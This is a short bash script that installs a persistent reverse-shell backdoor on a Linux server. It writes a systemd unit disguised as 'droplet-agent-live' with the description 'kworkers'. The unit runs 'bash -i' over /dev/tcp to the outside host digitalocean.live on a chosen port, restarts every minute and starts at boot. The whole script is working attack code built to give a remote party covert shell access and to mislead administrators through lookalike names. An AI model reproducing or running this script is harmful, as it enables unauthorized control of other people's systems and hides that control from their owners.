#!/bin/bash

read -p "Enter the port number to use for the reverse shell: " PORT

if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
  echo "Invalid port number. Please enter a number between 1 and 65535."
  exit 1
fi

SERVICE_FILE="/etc/systemd/system/droplet-agent-live.service"

SERVICE_CONTENT="[Unit]
Description=kworkers
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/digitalocean.live/$PORT 0>&1'
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target"

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

echo "$SERVICE_CONTENT" > "$SERVICE_FILE"
chmod 644 "$SERVICE_FILE"

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable droplet-agent-live.service
systemctl start droplet-agent-live.service

echo "Service installed and started on port $PORT."
